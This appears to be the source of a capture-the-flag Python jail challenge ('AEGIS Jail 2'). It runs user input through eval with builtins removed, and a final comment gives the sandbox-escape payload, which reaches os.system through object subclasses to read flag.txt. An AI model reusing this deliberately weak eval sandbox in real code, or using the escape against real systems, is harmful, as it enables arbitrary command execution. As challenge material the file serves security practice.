#!/usr/local/bin/python

logo="""
░█████╗░███████╗░██████╗░██╗░██████╗ Jail 2
██╔══██╗██╔════╝██╔════╝░██║██╔════╝
███████║█████╗░░██║░░██╗░██║╚█████╗░
██╔══██║██╔══╝░░██║░░╚██╗██║░╚═══██╗
██║░░██║███████╗╚██████╔╝██║██████╔╝
╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝╚═════╝░ Type "hint" to see source! """
print(logo)

while True:
    ip = input("AEGIS> ")
    if 'hint' in ip.lower():
        print(__import__('os').system('cat jail.py'))
        exit()
    try:
        print(eval(ip, {"__builtins__": {}}, {"__builtins__": {}}))
    except Exception as error:
        print("ERROR:", error)
        print("Good luck next time!")
        pass


# [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('cat flag.txt')